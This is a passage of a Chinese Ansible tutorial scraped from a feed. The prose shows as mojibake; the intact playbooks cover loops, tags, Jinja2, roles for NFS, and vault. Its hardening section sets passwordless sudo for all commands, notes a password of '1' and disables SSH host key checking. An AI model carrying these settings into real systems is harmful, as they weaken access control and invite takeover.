        name: <span class="hljs-string">"{{ item }}"</span>
        state: restarted
      loop:
        - rpcbind
        - nfs
</code></pre>
<blockquote>
<p>loopå’Œwith_itemsç”¨æ³•ä¸€è‡´</p>
</blockquote>
<ul>
<li>å¾ªç¯åˆ›å»ºç”¨æˆ·</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># vim 12.loop_user.yml </span>
- hosts: web01
  tasks:
    - name: Create www oldboy User
      user:
        name: <span class="hljs-string">"{{ item.name }}"</span>
        uid: <span class="hljs-string">"{{ item.uid }}"</span>
        group: <span class="hljs-string">"{{ item.group }}"</span>
        shell: <span class="hljs-string">"{{ item.shell }}"</span>
        create_home: <span class="hljs-string">"{{ item.home }}"</span>
        state: present
      loop:
        - { name: <span class="hljs-string">'www'</span>,uid: <span class="hljs-string">'666'</span> ,group: <span class="hljs-string">'www'</span>, shell: <span class="hljs-string">'/sbin/nologin'</span>,home: <span class="hljs-string">'false'</span> }
        - { name: <span class="hljs-string">'oldboy'</span>,uid: <span class="hljs-string">'667'</span> ,group: <span class="hljs-string">'root'</span>, shell: <span class="hljs-string">'/bin/bash'</span>,home: <span class="hljs-string">'true'</span>}

</code></pre>
<blockquote>
<p>å®˜ç½‘èµ„æ–™ï¼š      <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.ansible.com%2Fansible%2Flatest%2Fplaybook_guide%2Fplaybooks_loops.html" target="_blank" title="https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_loops.html" ref="nofollow noopener noreferrer">Loops â€” Ansible Documentation</a></p>
</blockquote>
<ul>
<li>åˆ›å»ºå¤šä¸ªæ–‡ä»¶</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">åˆ›å»ºå¤šä¸ªæ–‡ä»¶:
file:
	path: <span class="hljs-string">"{{ item.path }}"</span>
	owner: <span class="hljs-string">"{{ item.owner }}"</span>
	group: <span class="hljs-string">"{{ item.gorup }}"</span>
	state: <span class="hljs-built_in">touch</span>
	loop:
	  - { path: 1.txt , owner: www,group: www}
	  - { path: 2.txt , owner: www,group: www}
</code></pre>
<h5 data-id="heading-69">7.2å‰§æœ¬è°ƒè¯•</h5>
<ul>
<li>å‰§æœ¬å•æ­¥æ‰§è¡Œ</li>
<li>tagæ ‡ç­¾</li>
<li>å¿½ç•¥é”™è¯¯</li>
</ul>
<h6 data-id="heading-70">01 å•æ­¥æ‰§è¡Œ</h6>
<ul>
<li>-C æ¨¡æ‹Ÿè¿è¡Œ ä¸åšå‡ºæ”¹å˜</li>
<li>--syntax-check  åªåšè¯­æ³•æ£€æŸ¥ï¼Œä¸è¿è¡Œ</li>
<li>--step å•æ­¥è¿è¡Œ  yæ‰§è¡Œè¿™ä¸ªtaskï¼Œnå¿½ç•¥è¿™ä¸ªtaskï¼Œcè‡ªåŠ¨è¿è¡Œ</li>
</ul>
<h6 data-id="heading-71">02 tagæ ‡ç­¾</h6>
<ul>
<li>ç±»ä¼¼äºè¶…å¸‚ç‰©å“çš„åˆ†ç±»ï¼Œåªä¸è¿‡tagæ ‡ç­¾æ˜¯ç»™ansibleä¸­çš„taskè¿›è¡Œåˆ†ç±»ï¼ŒåŠ ä¸Šæ ‡è®°ã€‚</li>
<li>è¿è¡Œå‰§æœ¬çš„æ—¶å€™ è¿è¡ŒæŒ‡å®šçš„tagæ ‡ç­¾ï¼Œæˆ–æ’é™¤æŸäº›æ ‡ç­¾ã€‚</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"> tags:
   - æ ‡ç­¾å
è¿è¡Œå‰§æœ¬çš„æ—¶å€™
	-t è¿è¡Œçš„æ ‡ç­¾,å¦‚æœå¤šä¸ªæ ‡ç­¾é€šè¿‡<span class="hljs-string">","</span>åˆ†å‰²
	--skip-tags æ’é™¤æŒ‡å®šçš„tags,å¦‚æœå¤šä¸ªæ ‡ç­¾é€šè¿‡<span class="hljs-string">","</span>åˆ†å‰²
</code></pre>
<h6 data-id="heading-72">03 å¿½ç•¥é”™è¯¯</h6>
<ul>
<li>è¿è¡Œå‰§æœ¬çš„æ—¶å€™,å› ä¸ºé‡å¤è¿è¡Œå¯¼è‡´çš„é”™è¯¯æç¤º,å¹¶å‘æ˜¯çœŸçš„é”™è¯¯.</li>
<li>æ¯”å¦‚:ç›®å½•å·²ç»å­˜åœ¨,ç”¨æˆ·å·²ç»å­˜åœ¨.</li>
<li>åœ¨è¿™ç§æƒ…å†µä¸‹,æˆ‘ä»¬å¯ä»¥é€šè¿‡ignore_errorså¿½ç•¥é”™è¯¯,è®©å‰§æœ¬å¯ä»¥ç»§ç»­è¿è¡Œ.</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ignore_errors: <span class="hljs-literal">true</span>
	<span class="hljs-literal">true</span>/false
	<span class="hljs-built_in">yes</span>/no
</code></pre>
<h5 data-id="heading-73">7.3   Jinja2æ¨¡æ¿</h5>
<ul>
<li>åˆ†å‘nginxé…ç½®æ–‡ä»¶ ,éœ€è¦ä½¿ç”¨templateæ¨¡å—ä¸­server.conf.j2 è¿›è¡Œåˆ†å‘</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat 16.jinja2-for.yml </span>
- hosts: web
  gather_facts: <span class="hljs-literal">false</span>
  tasks:
    - name: åˆ†å‘nginxé…ç½®æ–‡ä»¶
      template:
        src: templates/server.conf.j2
        dest: /tmp/server.conf

</code></pre>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat templates/server.conf.j2 </span>
{% <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> [1,2,3,4,5,6] %}
  10.0.0.{{ ip }}
{%endfor%}
</code></pre>
<pre><code class="hljs language-sh" lang="sh"> ansible-playbook  16.jinja2-for.yml
</code></pre>
<ul>
<li>åˆ†å‘ä¹‹åç»“æœå¦‚ä¸‹</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5df0db43c5d841de98e214abbc3619ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=uMJIXBJT%2B9LgfD2eBTu0Nf1pNsg%3D" alt="image-20230329151229975" loading="lazy"/></p>
<h5 data-id="heading-74">7.4 includeæ–‡ä»¶åŒ…å«</h5>
<ul>
<li>
<p>åœ¨æˆ‘ä»¬ä¹¦å†™å‰§æœ¬çš„æ—¶å€™ï¼Œä¼šæ¶‰åŠåˆ°å¤šä¸ªæ­¥éª¤ï¼Œè¿˜ä¼šæ¶‰åŠåˆ°æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ã€‚</p>
</li>
<li>
<p>å‘ç°å‰§æœ¬è¶Šæ¥è¶Šå¤§ï¼Œä¸å®¹æ˜“è¿›è¡Œåˆ†æä¸é˜…è¯»ã€‚</p>
</li>
<li>
<p>æŠŠå‰§æœ¬æ‹†åˆ†å¼€ï¼Œåˆ†æˆ2ä¸ªæ–‡ä»¶ï¼ˆæœåŠ¡ç«¯ã€å®¢æˆ·ç«¯ï¼‰ã€‚</p>
</li>
<li>
<p>è¿™æ—¶å€™å¯ä»¥é€šè¿‡include_tasksçš„åŠŸèƒ½æŠŠå¤šä¸ªå‰§æœ¬æ–‡ä»¶åˆå¹¶åœ¨ä¸€èµ·ï¼Œè®©å‰§æœ¬å˜æˆå¤šä¸ªï¼Œæ–¹ä¾¿é˜…è¯»ä¸ç»´æŠ¤ã€‚</p>
</li>
<li>
<p>æ¡ˆä¾‹ï¼š é€šè¿‡include_taskså°†éƒ¨ç½²nfsæœåŠ¡æ‹†åˆ†04.deploy_nfs.yml</p>
<ul>
<li>01 deploy_nfs_server.yml</li>
<li>02 deploy_nfs_client.yml</li>
<li>03 deplay_nfs_all.yml</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat deploy_nfs_server.yml</span>
- name: 01. éƒ¨ç½²nfs-utils
  yum:
    name: nfs-utils,rpcbind
    state: installed
- name: 02. ä¿®æ”¹é…ç½®æ–‡ä»¶
  <span class="hljs-comment">#copyå‘é€è¿‡å»</span>
  lineinfile:
    path: /etc/exports
    line: <span class="hljs-string">"/backup-nfs/ 172.16.1.0/24(rw,all_squash) "</span>
  notify:
    - restart nfs server
- name: 03. å…±äº«ç›®å½•
  file:
    path: /backup-nfs/
    owner: nfsnobody
    group: nfsnobody
    state: directory
- name: 04. å¯åŠ¨æœåŠ¡rpc
  systemd:
    name: rpcbind
    enabled: <span class="hljs-built_in">yes</span>
    state: started
- name: 04. å¯åŠ¨æœåŠ¡nfs
  systemd:
    name: nfs
    enabled: <span class="hljs-built_in">yes</span>
    state: started

</code></pre>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat deploy_nfs_client.yml</span>
- name: 01. éƒ¨ç½²æœåŠ¡
  yum:
    name: nfs-utils,rpcbind
    state: installed

- name: 02. æŒ‚è½½
  mount:
    src: 172.16.1.41:/backup-nfs/
    path: /ans-upload/
    state: mounted
    fstype: nfs

</code></pre>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat deploy_nfs_all.yml</span>
- hosts: nfs
  tasks:
    - include_tasks: deploy_nfs_server.yml
  handlers:
    - name: restart nfs server
      systemd:
        name: nfs
        state: reloaded
- hosts: web
  tasks:
    - include_tasks: deploy_nfs_client.yml

</code></pre>
<h4 data-id="heading-75">8.Ansible-è§’è‰²ï¼ˆRolesï¼‰</h4>
<h6 data-id="heading-76">8.1 æ¦‚è¿°</h6>
<ul>
<li>æ˜¯ä¸€å¥—<strong>ç›®å½•ç»“æ„</strong>çš„è¦æ±‚ä¸æ ‡å‡†,è®©æˆ‘ä»¬ä¹¦å†™å‰§æœ¬çš„æ—¶å€™,æŠŠå‰§æœ¬çš„å†…å®¹å’Œéœ€è¦çš„æ–‡ä»¶,æŒ‰ç…§ç›®å½•è¦æ±‚,åˆ†é—¨åˆ«ç±»å­˜å‚¨.</li>
<li>ç›®å½•è§„èŒƒ</li>
<li>æ¨¡å—åŒ–æ€æƒ³</li>
<li>å°½é‡å¤šä½¿ç”¨å˜é‡</li>
<li>
<blockquote>
<p>ansible-galaxy init rsync</p>
</blockquote>
</li>
</ul>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.ansible.com%2Fansible%2Flatest%2Fplaybook_guide%2Fplaybooks_reuse_roles.html" target="_blank" title="https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_reuse_roles.html" ref="nofollow noopener noreferrer"> Roles â€” Ansible Documentation</a></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc24398d73e14db3a4d9fd7a0da84446~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=DVAXJZ2IMsZBMQ278o03AEMAKj4%3D" alt="image-20230329183550574" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12cb8159140b4bf0b8747bf4078c74d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=32rSyJJQW0iKAukSWAFRcmWzgtU%3D" alt="image-20230329183611554" loading="lazy"/></p>
<h6 data-id="heading-77">8.2 æ¡ˆä¾‹ï¼šrolesæ–¹å¼éƒ¨ç½²nfs-serverç«¯</h6>
<pre><code class="hljs language-bash" lang="bash">ansible-galaxy init nfs  
<span class="hljs-comment">#åˆ›å»ºrolesæ ‡å‡†åŒ–ç›®å½•</span>
[root@m01 roles]<span class="hljs-comment"># tree -F</span>
.
â”œâ”€â”€ hosts/
â”œâ”€â”€ nfs-server/
â”‚Â Â  â”œâ”€â”€ files/
â”‚Â Â  â”‚Â Â  â””â”€â”€ exports
â”‚Â Â  â”œâ”€â”€ handlers/
â”‚Â Â  â”‚Â Â  â””â”€â”€ main.yml
â”‚Â Â  â”œâ”€â”€ tasks/
â”‚Â Â  â”‚Â Â  â””â”€â”€ main.yml
â”‚Â Â  â””â”€â”€ templates/
â”‚Â Â      â””â”€â”€ motd.j2
â””â”€â”€ top.yml

6 directories, 5 files

<span class="hljs-comment">#ç¼–å†™ä¸»æ–‡ä»¶</span>
[root@m01 roles]<span class="hljs-comment"># vim nfs-server/tasks/main.yml </span>
- name: 01. éƒ¨ç½²nfs-utils
  yum:
    name: nfs-utils,rpcbind
    state: installed
  tags:
    - 01-install-nfs
- name: 02. ä¿®æ”¹é…ç½®æ–‡ä»¶
  copy:
    src: exports
    dest: /etc/exports
    backup: <span class="hljs-built_in">yes</span>
  tags:
    - 02-conf
  notify:
    - restart nfs server
- name: 03. å…±äº«ç›®å½•
  file:
    path: /backup-nfs/
    owner: nfsnobody
    group: nfsnobody
    state: directory
  tags:
    - 03-<span class="hljs-built_in">mkdir</span>
- name: 04. å¯åŠ¨æœåŠ¡rpc,nfs
  systemd:
    name: <span class="hljs-string">"{{ item }}"</span>
    enabled: <span class="hljs-built_in">yes</span>
    state: started
  loop:
    - rpcbind
    - nfs
  tags:
    - 04-start-service
- name: 05 åˆ†å‘motd
  template:
    src: motd.j2
    dest: /etc/motd
    backup: <span class="hljs-built_in">yes</span>
  tags:
    - 05-motd


<span class="hljs-comment">#ç¼–è¾‘ä¸å«å˜é‡çš„é…ç½®æ–‡ä»¶</span>
[root@m01 roles]<span class="hljs-comment"># cat nfs-server/files/exports </span>
/backup-nfs/ 172.16.1.0/24(rw,all_squash)

<span class="hljs-comment">#ç¼–è¾‘handlerè§¦å‘å™¨éƒ¨åˆ†</span>
[root@m01 roles]<span class="hljs-comment"># cat nfs-server/handlers/main.yml </span>
- name: restart nfs server
  systemd:
    name: nfs
    state: reloaded
    
<span class="hljs-comment">#ä½¿ç”¨å˜é‡æ¨¡æ¿æ–‡ä»¶ï¼Œä»¥.j2ç»“å°¾</span>
[root@m01 roles]<span class="hljs-comment"># cat nfs-server/templates/motd.j2 </span>
<span class="hljs-comment">#######################################</span>
 welcome to oldboy elastic linux system
 æ“ä½œéœ€è°¨æ…,åˆ æ ¹å¼¹æŒ‡é—´.
 ä¸»æœºå: {{ ansible_hostname }}
 ipåœ°å€: {{ ansible_default_ipv4.address }}
 å†…å­˜å¤§å°: {{ ansible_memtotal_mb }}
 CPUæ•°é‡: {{ ansible_processor_vcpus }}
 æ ¸å¿ƒæ€»æ•°: {{ ansible_processor_cores }}
 å‘è¡Œç‰ˆæœ¬: {{ ansible_distribution }}

</code></pre>
<ul>
<li>ä¹¦å†™å‰§æœ¬å…¥å£</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 roles]<span class="hljs-comment"># cat top.yml </span>
- hosts: backup
  roles:
    - role: nfs-server
</code></pre>
<ul>
<li>è¿è¡Œä¸è°ƒè¯•</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#æ³¨æ„è¿è¡Œæ—¶å€™æŒ‡å®šhostsæ–‡ä»¶å’Œå½“å‰è¦ä¸top.ymlåœ¨åŒä¸€ä¸ªç›®å½•.</span>
ansible-playbook -i hosts top.yml
</code></pre>
<h6 data-id="heading-78">8.3 åŠ å…¥å˜é‡</h6>
<ul>
<li>è·¯å¾„ã€ç”¨æˆ·ã€uidã€gidã€åŸŸå/ç«¯å£</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#æ–°å¢å˜é‡ç›®å½•ä¸æ–‡ä»¶group_vars/all/main.yml</span>

<span class="hljs-comment">#ç¼–è¾‘å˜é‡æ–‡ä»¶</span>
[root@m01 roles]<span class="hljs-comment"># cat group_vars/all/main.yml </span>
nfs_share_dir: /backup-nfs/
nfs_user: nfsnobody
nfs_user_id: 65534
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51653b5bb2d744948d94999631dae741~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=5FRj9xTQuwHzA8abyCsTs2MF%2BFY%3D" alt="image-20230329210032189" loading="lazy"/></p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#ä¸»å‰§æœ¬ä¸­ä¿®æ”¹å˜é‡</span>
- name: 02. ä¿®æ”¹é…ç½®æ–‡ä»¶
  template:
    src: exports.j2
    dest: /etc/exports
    backup: <span class="hljs-built_in">yes</span>
  tags:
    - 02-conf
  notify:
    - restart nfs server
   
- name: 03. å…±äº«ç›®å½•
  file:
    path: <span class="hljs-string">"{{ nfs_share_dir }}"</span>
    owner: <span class="hljs-string">"{{ nfs_user }}"</span>
    group: <span class="hljs-string">"{{ nfs_user }}"</span>
    state: directory
  tags:
    - 03-<span class="hljs-built_in">mkdir</span>

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0c8d203663e45ee8dff691c9be0727c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=9tAAod1NKevcXmAp%2FQ44cC4pANA%3D" alt="image-20230329210543468" loading="lazy"/></p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># åœ¨æ¨¡æ¿ç›®å½•ä¸­æ–°å¢exports.j2</span>
[root@m01 roles]<span class="hljs-comment"># vim nfs-server/templates/exports.j2 </span>

{{ nfs_share_dir }} 172.16.1.0/24(rw,all_squash,anonuid={{ nfs_user_id }} ,anongid={{ nfs_user_id }})
</code></pre>
<h4 data-id="heading-79">9.Ansible-Vault</h4>
<ul>
<li>ansible-vaultç”¨äºåŠ å¯†æ•æ„Ÿä¿¡æ¯</li>
<li>hostsæ–‡ä»¶ åŠ å¯†</li>
<li>å˜é‡æ–‡ä»¶ åŠ å¯†</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#è¿›è¡ŒåŠ å¯†</span>
ansible-vault encrypt æ–‡ä»¶
<span class="hljs-comment">#è¿›è¡Œä½¿ç”¨</span>
ansibleæˆ–ansible-playbook --ask-vault-pass å³å¯
<span class="hljs-comment">#å½»åº•è§£å¯†</span>
ansible-vault decrypt hosts
</code></pre>
<h4 data-id="heading-80">10.Ansible-Galaxy</h4>
<ul>
<li>åˆ«äººçš„roles</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible-galaxy collection install nginxinc.nginx_core
</code></pre>
<h4 data-id="heading-81">11.Ansible-ä¼˜åŒ–</h4>
<ul>
<li>
<p>æ€§èƒ½</p>
<ul>
<li>sshè¿æ¥é€Ÿåº¦ä¼˜åŒ–,å…³é—­UseDNS,GSSAPIAuthcation ....</li>
<li>ä¸è¦è®©ansibleè¿è¡Œäº¤äº’å¼çš„å‘½ä»¤,éè¦ç”¨ä½¿ç”¨å‘½ä»¤çš„éäº¤äº’æ¨¡å¼.</li>
<li>yumå®‰è£…æœ¬åœ°å®‰è£….(è‡ªå»ºyumæº,è‡ªå·±åˆ¶ä½œçš„rpmåŒ…)</li>
<li>è°ƒæ•´ansibleå¹¶å‘æ•°é‡( -f è°ƒæ•´å¹¶å‘æ•°é‡ é»˜è®¤æ˜¯5 ansible.cfg  forks=5,å®é™…è°ƒæ•´æ ¹æ®è´Ÿè½½æƒ…å†µ.)</li>
<li>ç»™ansibleé…ç½®ç¼“å­˜,é˜Ÿåˆ—</li>
<li>ç»™ä¸»æœºè¿›è¡Œåˆ†ç»„æ“ä½œ</li>
<li>å…³é—­gather_facts,å¦‚æœä¸ç”¨factså˜é‡å¯ä»¥å…³é—­, å‰§æœ¬ä¸­:gather_facts: false é…ç½®æ–‡ä»¶:gathering = explicit</li>
<li>å…³é—­host,key,check ä¸€èˆ¬ä½¿ç”¨å¯†ç è®¤è¯çš„æ—¶å€™éœ€è¦å…³é—­,å¦‚æœä¸å…³é—­\ansibleé…ç½®æ–‡ä»¶ host_key_checking = False</li>
</ul>
</li>
<li>
<p>å®‰å…¨</p>
<ul>
<li>é…ç½®sudoç”¨æˆ· ans ALL=(ALL) NOPASSWD: ALL å¯†ç æ˜¯1,sshç«¯å£æ˜¯ 22</li>
<li>é…åˆvpn,jmsä¸€èµ·ä½¿ç”¨</li>
<li>ç”¨æˆ· -- &gt;vpn----&gt;jms(è·³æ¿æœº)----&gt;ansibleç”¨æˆ·çš„å¯†ç ,è¿›è¡ŒåŠ å¯†( hash, ansible-vault)</li>
</ul>
</li>
<li>
<p>é…ç½®sudo</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#ç®¡ç†ç«¯</span>
[root@m01 /server/scripts/playbook]<span class="hljs-comment"># egrep -v '^$|#' /etc/ansible/ansible.cfg</span>
[defaults]
sudo_user = ans  <span class="hljs-comment">#è¢«ç®¡ç†ç«¯ä¸Šå…·æœ‰sudoæƒé™çš„ç”¨æˆ· nopasswd:ALL</span>
remote_user = ans    <span class="hljs-comment">#è¢«ç®¡ç†ç«¯ä½¿ç”¨çš„ç”¨æˆ·,ä¸æŒ‡å®šé»˜è®¤æ˜¯å½“å‰ç”¨æˆ·/root</span>
remote_port = 22      <span class="hljs-comment">#è¢«ç®¡ç†ç«¯sshç«¯å£å·</span>
host_key_checking = False
log_path = /var/log/ansible.log
[inventory]
[privilege_escalation]
become=True  <span class="hljs-comment">##å¼€å¯sudoåŠŸèƒ½</span>
become_method=sudo <span class="hljs-comment">#ä½¿ç”¨sudoå‘½ä»¤</span>
become_user=root <span class="hljs-comment">#æ™®é€šç”¨æˆ·åˆ‡æ¢ä¸ºroot</span>
[paramiko_connection]
[ssh_connection]
[persistent_connection]
[accelerate]
[selinux]
[colors]
[diff]


<span class="hljs-comment">#è¢«ç®¡ç†ç«¯</span>
vim /etc/sudoers

ans ALL=(ALL) NOPASSWD: ALL <span class="hljs-comment">#å¯†ç æ˜¯1,sshç«¯å£æ˜¯ 22</span>

<span class="hljs-comment">#ç¦ç”¨rootç™»å½•</span>
vim /etc/ssh/sshd_config 
PermitRootLogin no
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[websocketçš„ç†è§£ï¼Œå†™ä¸€ä¸ªåœ¨çº¿èŠå¤©å®¤]]></title>    <link>https://juejin.cn/post/7594627998839062570</link>    <guid>https://juejin.cn/post/7594627998839062570</guid>    <pubDate>2026-01-13T03:03:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594627998839062570" data-draft-id="7592887786967744548" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="websocketçš„ç†è§£ï¼Œå†™ä¸€ä¸ªåœ¨çº¿èŠå¤©å®¤"/> <meta itemprop="keywords" content="WebSocket"/> <meta itemprop="datePublished" content="2026-01-13T03:03:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ææ‰¿å½±"/> <meta itemprop="url" content="https://juejin.cn/user/2212696294690520"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            websocketçš„ç†è§£ï¼Œå†™ä¸€ä¸ªåœ¨çº¿èŠå¤©å®¤
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2212696294690520/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ææ‰¿å½±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:03:10.000Z" title="Tue Jan 13 2026 03:03:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 